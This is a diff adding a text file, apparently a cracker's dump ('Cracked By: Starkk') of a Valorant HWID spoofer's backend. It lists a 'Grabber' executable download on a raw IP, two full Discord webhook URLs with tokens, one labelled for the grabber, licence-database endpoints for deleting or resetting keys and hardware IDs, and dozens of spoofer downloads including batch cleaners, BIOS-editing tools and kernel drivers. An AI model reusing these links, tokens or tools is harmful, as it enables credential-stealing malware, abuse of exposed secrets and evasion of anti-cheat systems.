@@ -1,0 +1,62 @@
+Cracked By: Starkk#9673
+Cracked By: Starkk#9673
+Cracked By: Starkk#9673
+Cracked By: Starkk#9673
+Cracked By: Starkk#9673
+
+Grabber
+http://51.79.86.198/srd/download/SRDGrabb.exe
+
+AntiCrack Webhook
+https://discord.com/api/webhooks/979755169199820840/XT05f6gecHmIICPYLZ2WHUVv5zRgn_GSL-_JAHBMfRK-v0fmORfVaIrz7jM7L2IV1Yi_
+
+Grabber Webhook
+https://discord.com/api/webhooks/1027167371430993954/Gj1agXsnAaN1h2zgRJcBNgAqgQ4IQGP29c-1ikt1IhUeogxcwl77Z8nJ2ep2lUqXhw3O
+
+Database Link
+(Delete? Hwid)http://51.79.86.198/srd/api/delete.php?hwid=
+(Delete Key)http://51.79.86.198/srd/api/delete.php?key=
+(Info Hwid)http://51.79.86.198/srd/api/info.php?hwid=
+(Reset? Key/Hwid)http://51.79.86.198/srd/api/spoof.php?key=
+(?????)http://51.79.86.198/srd/api/?key=
+
+Spoofer
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/Reg_Spoof_new.bat
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/ValoCleaner.bat
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/ValoCleaner2.bat
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/Valorant.bat
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/Valorant_cache.bat
+http://51.79.86.198/srd/api/gigabyte0411/cleaner/VanguardCleaner.bat
+http://51.79.86.198/srd/api/gigabyte0411/main/Volumeid.exe
+http://51.79.86.198/srd/api/gigabyte0411/main/Volumeidx64.exe
+http://51.79.86.198/srd/api/gigabyte0411/main/mac.bat
+http://51.79.86.198/srd/api/gigabyte0411/main/Eula.txt
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/AMIDEWINx64.exe
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/AMIFLDRV32.SYS
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/AMIFLDRV64.SYS
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/UCOREDLL.dll
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/UCORESYS.sys
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/UCOREVXD.vxd
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/Ucorew64.sys
+http://51.79.86.198/srd/api/gigabyte0411/dmiedit/AMIDEWIN.exe
+http://51.79.86.198/srd/api/asus0411/dmiedit/AMIDEWINx64.exe
+http://51.79.86.198/srd/api/asus0411/dmiedit/AMIFLDRV32.SYS
+http://51.79.86.198/srd/api/asus0411/dmiedit/AMIFLDRV64.SYS
+http://51.79.86.198/srd/api/asus0411/dmiedit/UCOREDLL.dll
+http://51.79.86.198/srd/api/asus0411/dmiedit/UCORESYS.sys
+http://51.79.86.198/srd/api/asus0411/dmiedit/UCOREVXD.vxd
+http://51.79.86.198/srd/api/asus0411/dmiedit/Ucorew64.sys
+http://51.79.86.198/srd/api/asus0411/dmiedit/AMIDEWIN.exe
+http://51.79.86.198/srd/api/asus0411/cleaner/Reg_Spoof_new.bat
+http://51.79.86.198/srd/api/asus0411/cleaner/ValoCleaner.bat
+http://51.79.86.198/srd/api/asus0411/cleaner/ValoCleaner2.bat
+http://51.79.86.198/srd/api/asus0411/cleaner/Valorant.bat
+http://51.79.86.198/srd/api/asus0411/cleaner/Valorant_cache.bat
+http://51.79.86.198/srd/api/asus0411/cleaner/VanguardCleaner.bat
+http://51.79.86.198/srd/api/asus0411/main/asus.exe
+http://51.79.86.198/srd/api/asus0411/main/Volumeid.exe
+http://51.79.86.198/srd/api/asus0411/main/Volumeidx64.exe
+http://51.79.86.198/srd/api/asus0411/main/accessibility.dll
+http://51.79.86.198/srd/api/asus0411/main/amifldrv64.sys
+http://51.79.86.198/srd/api/asus0411/main/mac.bat
+http://51.79.86.198/srd/api/asus0411/main/Eula.txt
